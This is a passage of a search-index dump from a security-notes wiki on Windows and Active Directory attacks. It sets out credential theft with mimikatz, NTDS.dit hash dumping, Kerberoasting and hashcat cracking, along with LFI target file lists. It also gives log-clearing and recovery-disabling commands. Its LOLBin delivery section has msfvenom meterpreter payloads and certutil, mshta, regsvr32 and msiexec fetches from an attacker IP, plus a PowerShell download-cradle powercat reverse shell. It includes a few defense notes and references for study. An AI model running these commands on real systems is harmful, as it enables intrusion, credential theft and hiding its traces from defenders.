remoting","title":"Dumping Credentials on DC"},{"location":"os/windows/active-directory/#pass-the-hash","text":"Ref: https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf In typical scenario: User type the password LSASS hash the password (LM, NTLM) and send it to service for authentication In attack scenario: Attacker pass the hash (LM, NTML) itself to LSASS which is sent to service Preventions Disable NTML hashes \"Protected Users\" group Do not leave lot of NTLM authentication footprint in eventless","title":"Pass the Hash"},{"location":"os/windows/active-directory/#over-pass-the-hash-pass-the-key","text":"Ref: https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf If NTLM hash is available, encrypt timestamp with hash and sent it to KDC in AS-REQ to get a TGT Keys are in: Client LSASS memory Prevented by \"Protected Users\" group Active Directory NTDS.dit and SYSTEM hive Offline [Tool] NTDSXtract python DSUser . py ntds . dit . export / datatable . 4 ntds . dit . export / link_table . 7 . / work - name Administrator --syshive SYSTEM --supplcreds --passwordhashes --lmoutfile ./lm --ntoutfile ./nt --pwdformat john privilege :: debug sekurlsa :: ekeys Online privilege :: debug lsadump :: lsa / inject / name : Administrator Keys are in: DES RC4 - Non domain salted NTML hash AES128 AES256 keys (NT6+) Use PBKDF2 Salted 4096 iterations Cracking is difficult Over pass the hash privilege :: debug sekurlsa :: pth / user : Administrator / domain : DomainName / ntlm : Hash References http://www.janua.fr/active-directory-vulnerability-disclosure-weak-encryption-enables-attacker-to-change-victims-password-without-being-logged/","title":"Over Pass the Hash / Pass the Key"},{"location":"os/windows/active-directory/#pass-the-ticket","text":"Ref: https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf Inject the TGT in to the LSASS Kerberos Provider Do not ask the KDC for the TGT, instead ask the KDC to give us a TGS Can also inject TGS in to the LSASS Kerberos Provider Exporting from memory: API only allow exporting current user's tickets (your tickets) TGT: AllowTgtSessionKey reg-key must be set TGS: No restrictions http://msdn.microsoft.com/library/windows/desktop/aa378099.aspx LsaCallAuthenticationPackage / KerbRetrieveEncodedTicketMessage LsaCallAuthenticationPackage / KerbSubmitTicketMessage mimikatz kerberos :: list [ / export ] mimikatz kerberos :: ptt ticket For all users in LSASS memory: privilege :: debug sekurlsa :: tickets export kerberos : ptt ticket . kirbi","title":"Pass the Ticket"},{"location":"os/windows/active-directory/#dcsyc","text":"Used to sync AD to Azure Can be used to get credentials from AD If reverse encryption is enabled for an account, clear text password can be obtained. Needs Administrator or Domain Controller rights By default, no logs since this is done through official RPC (remotely) Implemented by: Mimikatz (lsadump:dcsync), Impacket, DSInternals DCSync is easy to detected","title":"DCSyc"},{"location":"os/windows/active-directory/#nrpc-netlogon","text":"When you have domain admin account for one DC, can as another DC to send all NTLM hashed of computer accounts and domain controller accounts. Can be used to create silver tickets. If you have rights flip some bytes of the account, can make a normal user account a workstation account. Can be used to get user accounts using this.","title":"NRPC (NetLogon)"},{"location":"os/windows/active-directory/#references","text":"Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory: https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html Escalating privileges with ACLs in Active Directory: https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/ https://blog.stealthbits.com/discovering-service-accounts-without-using-privileges https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting https://blog.stealthbits.com/impersonating-service-accounts-with-silver-tickets https://blog.stealthbits.com/complete-domain-compromise-with-golden-tickets/ https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a https://blog.stealthbits.com/performing-domain-reconnaissance-using-powershell https://blog.stealthbits.com/local-admin-mapping-bloodhound https://blog.stealthbits.com/extracting-password-hashes-from-the-ntds-dit-file/ https://blog.stealthbits.com/passing-the-hash-with-mimikatz https://blog.stealthbits.com/what-is-dcsync-an-introduction/ https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/ https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/ https://blog.ropnop.com/practical-usage-of-ntlm-hashes/ https://blog.ropnop.com/extracting-hashes-and-domain-info-from-ntds-dit/ https://blog.ropnop.com/using-credentials-to-own-windows-boxes/ https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/ https://0xdarkvortex.dev/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/ https://0xdarkvortex.dev/index.php/2018/08/26/active-directory-penetration-dojo-setup-of-ad-penetration-labpart-2/ https://0xdarkvortex.dev/index.php/2018/10/29/active-directory-penetration-dojo-creation-of-forest-trustpart-3/ https://www.attackdebris.com/?p=470 https://blog.didierstevens.com/2016/08/12/mimikatz-golden-ticket-dcsync/ https://adsecurity.org/?p=2362 https://pentestlab.blog/tag/ntds-dit/ http://www.harmj0y.net/blog/penetesting/pass-the-hash-is-dead-long-live-pass-the-hash/ http://passing-the-hash.blogspot.com/ http://blog.liatsisfotis.com/knock-and-pass-kerberos-exploitation.html https://room362.com/post/2017/reset-ad-user-password-with-linux/ https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a TR19: I'm in your cloud, reading everyone's emails - hacking Azure AD via Active Directory: https://www.youtube.com/watch?v=JEIR5oGCwdg Azure AD Connect for Red Teamers: https://blog.xpnsec.com/azuread-connect-for-redteam/ https://github.com/hausec/PowerZure How Attackers Pull the Active Directory Database (NTDS.dit) from a Domain Controller: https://adsecurity.org/?p=451 Attack Methods for Gaining Domain Admin Rights in Active Directory: https://adsecurity.org/?p=2362 Mimikatz DCSync Usage, Exploitation, and Detection: https://adsecurity.org/?p=1729 How Attackers Dump Active Directory Database Credentials: https://adsecurity.org/?p=2398","title":"References"},{"location":"os/windows/active-directory/#defense","text":"Active Directory Core Security Principles Best Practices: https://ernw.de/download/AD_Summit_2018/01_AD_Summit_CoreSecPrinciples_fk_hw_v.1.2_signed.pdf Active Directory Kill Chain Attack Defense: https://github.com/infosecn1nja/AD-Attack-Defense Microsoft-Blue-Forest: https://github.com/rootsecdev/Microsoft-Blue-Forest Welcome to building your first domain controller!: https://github.com/rootsecdev/Microsoft-Blue-Forest/blob/master/FirstDomainControllerInstall.md Pwn and Defend - Active Directory Domain Enumeration: https://www.youtube.com/watch?v=YxeXfHkHAUI feature=youtu.be","title":"Defense"},{"location":"os/windows/active-directory/#kb2871997","text":"https://technet.microsoft.com/library/security/2871997 Microsoft has definitely raised the bar: accounts that are members of the localgroup \u201cAdministrators\u201d are no longer able to execute code with WMI or PSEXEC, use schtasks or at, or even browse the open shares on the target machine. Oh, except (as pwnag3 reports and our experiences confirm) the RID 500 built-in Administrator account, even if it\u2019s renamed.","title":"KB2871997"},{"location":"os/windows/active-directory/#microsoft-windows-ad-kerberos-tickets","text":"Gather tickets GetUserSPNs . py - request ( HOST . DOMAIN ) / ( VALID SMB USER ):( USER PASSWORD ) Crack - a 0 - Straight cracking mode - m 13100 - Hashtype 13100 - which is Kerberos 5 TGS - REP etype 23 the kerberos . ticket file - w 3 - Suggested example workload setting for Hashcat .\\ hashcat64 . exe - m 13100 - a 0 C:\\Users\\weaknet\\Desktop\\Portfolio\\VMWare Shared\\kerberos.tick et -w 3 C :\\ Users \\ weaknet \\ Desktop \\ Portfolio \\ VMWare Shared \\ rockyou . txt hashcat ( v5 . 1 . 0 ) starting ...","title":"Microsoft Windows AD Kerberos Tickets"},{"location":"os/windows/active-directory/#dump","text":"ldapdomaindump - u example \\ example 10 . 10 . 10 . 10","title":"Dump"},{"location":"os/windows/api/","text":"Windows API Network Related ARP Table GetIPNetTable Services Change Services ChangeServiceConfigW","title":"Windows API"},{"location":"os/windows/api/#windows-api","text":"","title":"Windows API"},{"location":"os/windows/api/#network-related","text":"","title":"Network Related"},{"location":"os/windows/api/#arp-table","text":"GetIPNetTable","title":"ARP Table"},{"location":"os/windows/api/#services","text":"","title":"Services"},{"location":"os/windows/api/#change-services","text":"ChangeServiceConfigW","title":"Change Services"},{"location":"os/windows/applocker/","text":"References https://github.com/api0cradle/UltimateAppLockerByPassList","title":"Applocker"},{"location":"os/windows/applocker/#references","text":"https://github.com/api0cradle/UltimateAppLockerByPassList","title":"References"},{"location":"os/windows/events/","text":"Events Tools EtwExplorer View Event Tracing for Windows (ETW) Provider manifests GitHub: https://github.com/zodiacon/EtwExplorer","title":"Events"},{"location":"os/windows/events/#events","text":"","title":"Events"},{"location":"os/windows/events/#tools","text":"","title":"Tools"},{"location":"os/windows/events/#etwexplorer","text":"View Event Tracing for Windows (ETW) Provider manifests GitHub: https://github.com/zodiacon/EtwExplorer","title":"EtwExplorer"},{"location":"os/windows/hyperv/","text":"HyperV References Fuzzing para-virtualized devices in Hyper-V: https://blogs.technet.microsoft.com/srd/2019/01/28/fuzzing-para-virtualized-devices-in-hyper-v/ Writing a Hyper-V \"Bridge\" for Fuzzing \u2014 Part 1: WDF: http://www.alex-ionescu.com/?p=377 Writing a Hyper-V \"Bridge\" for Fuzzing \u2014 Part 2 : Hypercalls MDLs: http://www.alex-ionescu.com/?p=471 https://blogs.technet.microsoft.com/srd/2018/12/10/first-steps-in-hyper-v-research/ https://blogs.technet.microsoft.com/srd/2018/05/03/hyper-v-debugging-symbols-are-publicly-available/ https://github.com/comaeio/LiveCloudKd","title":"HyperV"},{"location":"os/windows/hyperv/#hyperv","text":"","title":"HyperV"},{"location":"os/windows/hyperv/#references","text":"Fuzzing para-virtualized devices in Hyper-V: https://blogs.technet.microsoft.com/srd/2019/01/28/fuzzing-para-virtualized-devices-in-hyper-v/ Writing a Hyper-V \"Bridge\" for Fuzzing \u2014 Part 1: WDF: http://www.alex-ionescu.com/?p=377 Writing a Hyper-V \"Bridge\" for Fuzzing \u2014 Part 2 : Hypercalls MDLs: http://www.alex-ionescu.com/?p=471 https://blogs.technet.microsoft.com/srd/2018/12/10/first-steps-in-hyper-v-research/ https://blogs.technet.microsoft.com/srd/2018/05/03/hyper-v-debugging-symbols-are-publicly-available/ https://github.com/comaeio/LiveCloudKd","title":"References"},{"location":"os/windows/important-endpoints/","text":"Important Endpoints Connection endpoints for Windows 10 https://docs.microsoft.com/en-us/windows/privacy/manage-windows-1809-endpoints","title":"Important Endpoints"},{"location":"os/windows/important-endpoints/#important-endpoints","text":"","title":"Important Endpoints"},{"location":"os/windows/important-endpoints/#connection-endpoints-for-windows-10","text":"https://docs.microsoft.com/en-us/windows/privacy/manage-windows-1809-endpoints","title":"Connection endpoints for Windows 10"},{"location":"os/windows/important-files/","text":"Important Files LFI Windows Files : % SYSTEMROOT % \\ repair \\ system % SYSTEMROOT % \\ repair \\ SAM % SYSTEMROOT % \\ repair \\ SAM % WINDIR % \\ win . ini % SYSTEMDRIVE % \\ boot . ini % WINDIR % \\ Panther \\ sysprep . inf % WINDIR % \\ system32 \\ config \\ AppEvent . Evt Collections Windows EXE / DLL files: http://www.saule-spb.ru/touch/windows_files.html Living Off The Land Binaries and Scripts: https://lolbas-project.github.io/ li, https://github.com/LOLBAS-Project/LOLBAS https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/ Version information sysinfo Windows 7+: / windows / system32 / license . rtf / windows / system32 / eula . txt Update information WindowsUpdate . log Update Download locations C : \\ Windows \\ SoftwareDistribution \\ Download wbadmin / ntbackup https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin Perform backups and restores of operating systems, drive volumes, computer files, folders, and applications from a command-line interface. Delete any recovery catalogs: cmd . exe / c wbadmin . exe delete catalog - quiet BCDEdit https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/bcdedit-command-line-options Tool for managing Boot Configuration Data (BCD). BCD files provide a store that is used to describe boot applications and boot application settings. Usable to creating new stores, modifying existing stores, adding boot menu options, and so on. Windows recovery console does not attempt to repair anything: cmd . exe / c bcdedit . exe / set { default } bootstatuspolicy ignoreallfailures bcdedit / set { default } recoveryenabled no wevtutil https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil Enables you to retrieve information about event logs and publishers. You can also use this command to install and uninstall event manifests, to run queries, and to export, archive, and clear logs. Clear System and Security logs: cmd . exe / c wevtutil . exe cl System cmd . exe / c wevtutil . exe cl Security DUMPBIN https://docs.microsoft.com/en-us/cpp/build/reference/dumpbin-reference?view=vs-2017 Displays information about Common Object File Format (COFF) binary files. You can use DUMPBIN to examine COFF object files, standard libraries of COFF objects, executable files, and dynamic-link libraries (DLLs). HTA Application where source code consists of HTML, Dynamic HTML, and one or more scripting languages supported by Internet Explorer, such as VBScript or JScript. An HTA executes without the constraints of the internet browser security model; it executes as a \"fully trusted\" application. Mshta.exe (HTA) Running HTA( HTML Application) files use exploit / windows / misc / hta_server msf exploit ( windows / misc / hta_server ) set srvhost 192 . 168 . 1 . 109 msf exploit ( windows / misc / hta_server ) set lhost 192 . 168 . 1 . 109 msf exploit ( windows / misc / hta_server ) exploit mshta . exe http : // 192 . 168 . 1 . 109 : 8080 / 5 EEiDSd70ET0k . hta Rundll32.exe Invoke a function exported from a DLL use exploit / windows / smb / smb_delivery msf exploit ( windows / smb / smb_delivery ) set srvhost 192 . 168 . 1 . 109 msf exploit ( windows / smb / smb_delivery ) exploit rundll32 . exe \\\\ 192 . 168 . 1 . 109 \\ vabFG \\ test . dll , 0 Regsvr32.exe Register and unregister OLE controls, such as DLLs and ActiveX controls in the Windows Registry installed in the %systemroot%\\System32 Windows XP and later Regsvr32 uses \u201csquiblydoo\u201d technique for bypassing application whitelisting Able to request a .sct file and then execute the included PowerShell command inside Syntax : Regsvr32 [ / s ][ / u ] [ / n ] [ / i [: cmdline ]] dllname / u \u2013 Unregister server / i \u2013 Call DllInstall passing it an optional [ cmdline ] ; when it is used with /u, it calls dll to uninstall / n \u2013 do not call DllRegisterServer ; this option must be used with /i / s \u2013 Silent ; display no message boxes use exploit / multi / script / web_delivery msf exploit ( web_delivery ) set target 3 msf exploit ( web_delivery ) set payload windows / meterpreter / reverse_tcp msf exploit ( web_delivery ) set lhost 192 . 168 . 1 . 109 msf exploit ( web_delivery ) set srvhost 192 . 168 . 1 . 109 msf exploit ( web_delivery ) exploit regsvr32 / s / n / u / i : http : // 192 . 168 . 1 . 109 : 8080 / xo31Jt5dIF . sct scrobj . dll - https://gist.github.com/coh7eiqu8thaBu/809f49aa24ace2b9f326ab419f7b124a - https://web.archive.org/web/20170419145048/http://subt0x10.blogspot.com/2016/04/bypass-application-whitelisting-script.html - https://www.carbonblack.com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/ Certutil.exe msfvenom - p windows / meterpreter / reverse_tcp lhost = 192 . 168 . 1 . 109 lport = 1234 - f exe shell . exe certutil . exe - urlcache - split - f http : // 192 . 168 . 1 . 109 / shell . exe shell . exe shell . exe Powershell.exe git clone https :// github . com / besimorhino / powercat . git python -m SimpleHTTPServer 80 powershell -c IEX(New-Object System.Net.WebClient).DownloadString( http://192.168.1.109/powercat.ps1 );powercat -c 192.168.1.109 -p 1234 -e cmd Batch Files msfvenom - p cmd / windows / reverse_powershell lhost = 192 . 168 . 1 . 109 lport = 4444 1 . bat powershell - c IEX (( New - Object System . Net . WebClient ). DownloadString ( http://192.168.1.109/1.bat )) Cscript msfvenom -p cmd / windows / reverse_powershell lhost = 192 . 168 . 1 . 109 lport = 1234 -f vbs 1 . vbs script . exe test.vbs powershell . exe -c (New-Object System.NET.WebClient).DownloadFile( http://192.168.1.109/1.vbs ,\\ $env:temp\\test.vbs\\ );Start-Process %windir%\\system32\\cscript.exe \\ $env:temp\\test.vbs\\ Msiexec.exe Install MSI packages msfvenom - p windows / meterpreter / reverse_tcp lhost = 192 . 168 . 1 . 109 lport = 1234 - f msi 1 . msi msiexec / q / i http : // 192 . 168 . 1 . 109 / 1 . msi Wmic.exe WMI command-line interface that is used for a variety of administrative functions for local and remote machine can invoke XSL script (eXtensible Stylesheet Language) koadic: use stager / js / wmic set SRVHOST 192 . 168 . 1 . 107 run wmic os get / FORMAT : http://192.168.1.107:9996/g8gkv.xsl Prefetch Files Created AT.EXE (scheduled jobs/tasks) SCHTASKS.EXE (scheduled jobs/tasks) CMD.EXE (Obviously common, but I included it anyway. Especially if the prefetch hash doesn't match the legitimate ones. ) NET.EXE (net view, etc.) NET1.EXE (net use) NETSTAT.EXE (netstat -ano) REG.EXE (reg query and reg add) SC.EXE (interact with services) SYSTEMINFO.EXE (system profiling) TASKKILL.EXE (kill running processes) TASKLIST.EXE (tasklist /v) POWERSHELL.EXE (interact with powershell) NBTSTAT.EXE (profile) XCOPY.EXE (copy files around) NSLOOKUP.EXE (profile) QUSER.EXE (profile) RAR.EXE (Exfil or Tool dropping) * And other archive utilities (Ex. 7zip) PING.EXE (check connectivity) FTP.EXE (download/upload) Various Sysinternal tools (Psexec, sdelete, etc.) BITSADMIN.EXE (download/upload) ROUTE.EXE (adding persistent routes) REGSVR32.EXE (services) MAKECAB.EXE (compression before exfil) Originally form: http://www.sysforensics.org/2014/01/lateral-movement/ . Link is no longer working Runonce.exe, msdt.exe, Openwith.exe https://medium.com/@mattharr0ey/lolbas-blowing-in-the-binaries-path-c480176cc636 sethc.exe (Sticky keys) By replacing the \u201cSticky Keys\u201d binary, C:\\Windows\\System32\\sethc.exe, with the Windows Command Processor cmd.exe, the attackers then accessed a privileged Windows console session without authenticating to the system. \u201cSticky Keys\u201d is an accessibility feature that allows users to activate Windows modifier keys without pressing more than one key at a time. Pressing the shift key five times activates \u201cSticky Keys\u201d and executes sethc.exe, which, when replaced with cmd.exe, opens a System-level command shell. From this shell, the attackers can execute arbitrary Windows commands, including adding or modifying accounts on the system, even from the logon screen (pre-authentication). Discovery C : / Users / Administrator / NTUser . dat C : / Documents and Settings / Administrator / NTUser . dat C : / apache / logs / access . log C : / apache / logs / error . log C : / apache / php / php . ini C : / boot . ini C : / inetpub / wwwroot / global . asa C : / MySQL / data / hostname . err C : / MySQL / data / mysql . err C : / MySQL / data / mysql . log C : / MySQL / my . cnf C : / MySQL / my . ini C : / php4 / php . ini C : / php5 / php . ini C : / php / php . ini C : / Program Files / Apache Group / Apache2 / conf / httpd . conf C : / Program Files / Apache Group / Apache / conf / httpd . conf C : / Program Files / Apache Group / Apache / logs / access . log C : / Program Files / Apache Group / Apache / logs / error . log C : / Program Files / FileZilla Server / FileZilla Server . xml C : / Program Files / MySQL / data / hostname . err C : / Program Files / MySQL / data / mysql - bin . log C : / Program Files / MySQL / data / mysql . err C : / Program Files / MySQL / data / mysql . log C : / Program Files / MySQL / my . ini C : / Program Files / MySQL / my . cnf C : / Program Files / MySQL / MySQL Server 5.0 / data / hostname . err C : / Program Files / MySQL / MySQL Server 5.0 / data / mysql - bin . log C : / Program Files / MySQL / MySQL Server 5.0 / data / mysql . err C : / Program Files / MySQL / MySQL Server 5.0 / data / mysql . log C : / Program Files / MySQL / MySQL Server 5.0 / my . cnf C : / Program Files / MySQL / MySQL Server 5.0 / my . ini C : / Program Files ( x86 ) / Apache Group / Apache2 / conf / httpd . conf C : / Program Files ( x86 ) / Apache Group / Apache / conf / httpd . conf C : / Program Files ( x86 ) / Apache Group / Apache / conf / access . log C : / Program Files ( x86 ) / Apache Group / Apache / conf / error . log C : / Program Files ( x86 ) / FileZilla Server / FileZilla Server . xml C : / Program Files ( x86 ) / xampp / apache / conf / httpd . conf C : / WINDOWS / php . ini C : / WINDOWS / Repair / SAM C : / Windows / repair / system C : / Windows / repair / software C : / Windows / repair / security C : / WINDOWS / System32 / drivers / etc / hosts C : / Windows / win . ini C : / WINNT / php . ini C : / WINNT / win . ini C : / xampp / apache / bin / php . ini C : / xampp / apache / logs / access . log C : / xampp / apache / logs / error . log C : / Windows / Panther / Unattend / Unattended . xml C : / Windows / Panther / Unattended . xml C : / Windows / debug / NetSetup . log C : / Windows / system32 / config / AppEvent . Evt C : / Windows / system32 / config / SecEvent . Evt C : / Windows / system32 / config / default . sav C : / Windows / system32 / config / security . sav C : / Windows / system32 / config / software . sav C : / Windows / system32 / config / system . sav C : / Windows / system32 / config / regback / default C : / Windows / system32 / config / regback / sam C : / Windows / system32 / config / regback / security C : / Windows / system32 / config / regback / system C : / Windows / system32 / config / regback / software C : / Program Files / MySQL / MySQL Server 5.1 / my . ini C : / Windows / System32 / inetsrv / config / schema / ASPNET_schema . xml C : / Windows / System32 / inetsrv / config / applicationHost . config C : / inetpub / logs / LogFiles / W3SVC1 / u_ex [ YYMMDD ] . log Base64 encode / decode certutil - encode inputfile outputfile certutil - decode inputfile outputfile","title":"Important Files"},{"location":"os/windows/important-files/#important-files","text":"LFI Windows Files : % SYSTEMROOT % \\ repair \\ system % SYSTEMROOT % \\ repair \\ SAM % SYSTEMROOT % \\ repair \\ SAM % WINDIR % \\ win . ini % SYSTEMDRIVE % \\ boot . ini % WINDIR % \\ Panther \\ sysprep . inf % WINDIR % \\ system32 \\ config \\ AppEvent . Evt","title":"Important Files"},{"location":"os/windows/important-files/#collections","text":"Windows EXE / DLL files: http://www.saule-spb.ru/touch/windows_files.html Living Off The Land Binaries and Scripts: https://lolbas-project.github.io/ li, https://github.com/LOLBAS-Project/LOLBAS https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/","title":"Collections"},{"location":"os/windows/important-files/#version-information","text":"sysinfo Windows 7+: / windows / system32 / license . rtf / windows / system32 / eula . txt","title":"Version information"},{"location":"os/windows/important-files/#update-information","text":"WindowsUpdate . log","title":"Update information"},{"location":"os/windows/important-files/#update-download-locations","text":"C : \\ Windows \\ SoftwareDistribution \\ Download","title":"Update Download locations"},{"location":"os/windows/important-files/#wbadmin-ntbackup","text":"https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin Perform backups and restores of operating systems, drive volumes, computer files, folders, and applications from a command-line interface. Delete any recovery catalogs: cmd . exe / c wbadmin . exe delete catalog - quiet","title":"wbadmin / ntbackup"},{"location":"os/windows/important-files/#bcdedit","text":"https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/bcdedit-command-line-options Tool for managing Boot Configuration Data (BCD). BCD files provide a store that is used to describe boot applications and boot application settings. Usable to creating new stores, modifying existing stores, adding boot menu options, and so on. Windows recovery console does not attempt to repair anything: cmd . exe / c bcdedit . exe / set { default } bootstatuspolicy ignoreallfailures bcdedit / set { default } recoveryenabled no","title":"BCDEdit"},{"location":"os/windows/important-files/#wevtutil","text":"https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil Enables you to retrieve information about event logs and publishers. You can also use this command to install and uninstall event manifests, to run queries, and to export, archive, and clear logs. Clear System and Security logs: cmd . exe / c wevtutil . exe cl System cmd . exe / c wevtutil . exe cl Security","title":"wevtutil"},{"location":"os/windows/important-files/#dumpbin","text":"https://docs.microsoft.com/en-us/cpp/build/reference/dumpbin-reference?view=vs-2017 Displays information about Common Object File Format (COFF) binary files. You can use DUMPBIN to examine COFF object files, standard libraries of COFF objects, executable files, and dynamic-link libraries (DLLs).","title":"DUMPBIN"},{"location":"os/windows/important-files/#hta","text":"Application where source code consists of HTML, Dynamic HTML, and one or more scripting languages supported by Internet Explorer, such as VBScript or JScript. An HTA executes without the constraints of the internet browser security model; it executes as a \"fully trusted\" application.","title":"HTA"},{"location":"os/windows/important-files/#mshtaexe-hta","text":"Running HTA( HTML Application) files use exploit / windows / misc / hta_server msf exploit ( windows / misc / hta_server ) set srvhost 192 . 168 . 1 . 109 msf exploit ( windows / misc / hta_server ) set lhost 192 . 168 . 1 . 109 msf exploit ( windows / misc / hta_server ) exploit mshta . exe http : // 192 . 168 . 1 . 109 : 8080 / 5 EEiDSd70ET0k . hta","title":"Mshta.exe (HTA)"},{"location":"os/windows/important-files/#rundll32exe","text":"Invoke a function exported from a DLL use exploit / windows / smb / smb_delivery msf exploit ( windows / smb / smb_delivery ) set srvhost 192 . 168 . 1 . 109 msf exploit ( windows / smb / smb_delivery ) exploit rundll32 . exe \\\\ 192 . 168 . 1 . 109 \\ vabFG \\ test . dll , 0","title":"Rundll32.exe"},{"location":"os/windows/important-files/#regsvr32exe","text":"Register and unregister OLE controls, such as DLLs and ActiveX controls in the Windows Registry installed in the %systemroot%\\System32 Windows XP and later Regsvr32 uses \u201csquiblydoo\u201d technique for bypassing application whitelisting Able to request a .sct file and then execute the included PowerShell command inside Syntax : Regsvr32 [ / s ][ / u ] [ / n ] [ / i [: cmdline ]] dllname / u \u2013 Unregister server / i \u2013 Call DllInstall passing it an optional [ cmdline ] ; when it is used with /u, it calls dll to uninstall / n \u2013 do not call DllRegisterServer ; this option must be used with /i / s \u2013 Silent ; display no message boxes use exploit / multi / script / web_delivery msf exploit ( web_delivery ) set target 3 msf exploit ( web_delivery ) set payload windows / meterpreter / reverse_tcp msf exploit ( web_delivery ) set lhost 192 . 168 . 1 . 109 msf exploit ( web_delivery ) set srvhost 192 . 168 . 1 . 109 msf exploit ( web_delivery ) exploit regsvr32 / s / n / u / i : http : // 192 . 168 . 1 . 109 : 8080 / xo31Jt5dIF . sct scrobj . dll - https://gist.github.com/coh7eiqu8thaBu/809f49aa24ace2b9f326ab419f7b124a - https://web.archive.org/web/20170419145048/http://subt0x10.blogspot.com/2016/04/bypass-application-whitelisting-script.html - https://www.carbonblack.com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/","title":"Regsvr32.exe"},{"location":"os/windows/important-files/#certutilexe","text":"msfvenom - p windows / meterpreter / reverse_tcp lhost = 192 . 168 . 1 . 109 lport = 1234 - f exe shell . exe certutil . exe - urlcache - split - f http : // 192 . 168 . 1 . 109 / shell . exe shell . exe shell . exe","title":"Certutil.exe"},{"location":"os/windows/important-files/#powershellexe","text":"git clone https :// github . com / besimorhino / powercat . git python -m SimpleHTTPServer 80 powershell -c IEX(New-Object System.Net.WebClient).DownloadString( http://192.168.1.109/powercat.ps1 );powercat -c 192.168.1.109 -p 1234 -e cmd","title":"Powershell.exe"},{"location":"os/windows/important-files/#batch-files","text":"msfvenom - p cmd / windows / reverse_powershell lhost = 192 . 168 . 1 . 109 lport = 4444 1 . bat powershell - c IEX (( New - Object System . Net . WebClient ). DownloadString ( http://192.168.1.109/1.bat ))","title":"Batch Files"},{"location":"os/windows/important-files/#cscript","text":"msfvenom -p cmd / windows / reverse_powershell lhost = 192 . 168 . 1 . 109 lport = 1234 -f vbs 1 . vbs script . exe test.vbs powershell . exe -c (New-Object System.NET.WebClient).DownloadFile( http://192.168.1.109/1.vbs ,\\ $env:temp\\test.vbs\\ );Start-Process %windir%\\system32\\cscript.exe \\ $env:temp\\test.vbs\\","title":"Cscript"},{"location":"os/windows/important-files/#msiexecexe","text":"Install MSI packages msfvenom - p windows / meterpreter / reverse_tcp lhost = 192 . 168 . 1 . 109 lport = 1234 - f msi 1 . msi msiexec / q / i http : // 192 . 168 . 1 . 109 / 1 . msi","title":"Msiexec.exe"},{"location":"os/windows/important-files/#wmicexe","text":"WMI command-line interface that is used for a variety of administrative functions for local and remote machine can invoke XSL script (eXtensible Stylesheet Language) koadic: use stager / js / wmic set SRVHOST 192 . 168 . 1 . 107 run wmic os get / FORMAT : http://192.168.1.107:9996/g8gkv.xsl","title":"Wmic.exe"},{"location":"os/windows/important-files/#prefetch-files-created","text":"AT.EXE (scheduled jobs/tasks) SCHTASKS.EXE (scheduled jobs/tasks) CMD.EXE (Obviously common, but I included it anyway. Especially if the prefetch hash doesn't match the legitimate ones. ) NET.EXE (net view, etc.) NET1.EXE (net use) NETSTAT.EXE (netstat -ano) REG.EXE (reg query and reg add) SC.EXE (interact with services) SYSTEMINFO.EXE (system profiling) TASKKILL.EXE (kill running processes) TASKLIST.EXE (tasklist /v) POWERSHELL.EXE (interact with powershell) NBTSTAT.EXE (profile) XCOPY.EXE (copy files around) NSLOOKUP.EXE (profile) QUSER.EXE (profile) RAR.EXE (Exfil or Tool dropping) * And other archive utilities (Ex. 7zip) PING.EXE (check connectivity) FTP.EXE (download/upload) Various Sysinternal tools (Psexec, sdelete, etc.) BITSADMIN.EXE (download/upload) ROUTE.EXE (adding persistent routes) REGSVR32.EXE (services) MAKECAB.EXE (compression before exfil) Originally form: http://www.sysforensics.org/2014/01/lateral-movement/ . Link is no longer working","title":"Prefetch Files Created"},{"location":"os/windows/important-files/#runonceexe-msdtexe-openwithexe","text":"https://medium.com/@mattharr0ey/lolbas-blowing-in-the-binaries-path-c480176cc636","title":"Runonce.exe, msdt.exe, Openwith.exe"},{"location":"os/windows/important-files/#sethcexe-sticky-keys","text":"By replacing the \u201cSticky Keys\u201d binary, C:\\Windows\\System32\\sethc.exe, with the Windows Command Processor cmd.exe, the attackers then accessed a privileged Windows console session without authenticating to the system. \u201cSticky Keys\u201d is an accessibility feature that allows users to activate Windows modifier keys without pressing more than one key at a time. Pressing the shift key five times activates \u201cSticky Keys\u201d and executes sethc.exe, which, when replaced with cmd.exe, opens a System-level command shell. From this shell, the attackers can execute arbitrary Windows commands, including adding or modifying accounts on the system, even from the logon screen (pre-authentication).","title":"sethc.exe (Sticky keys)"},{"location":"os/windows/important-files/#discovery","text":"C : / Users / Administrator / NTUser . dat C : / Documents and Settings / Administrator / NTUser . dat C : / apache / logs / access . log C : / apache / logs / error . log C : / apache / php / php . ini C : / boot . ini C : / inetpub / wwwroot / global . asa C : / MySQL / data / hostname . err C : / MySQL / data / mysql . err C : / MySQL / data / mysql . log C : / MySQL / my . cnf C : / MySQL / my . ini C : / php4 / php . ini C : / php5 / php . ini C : / php / php . ini C : / Program Files / Apache Group / Apache2 / conf / httpd . conf C : / Program Files / Apache Group / Apache / 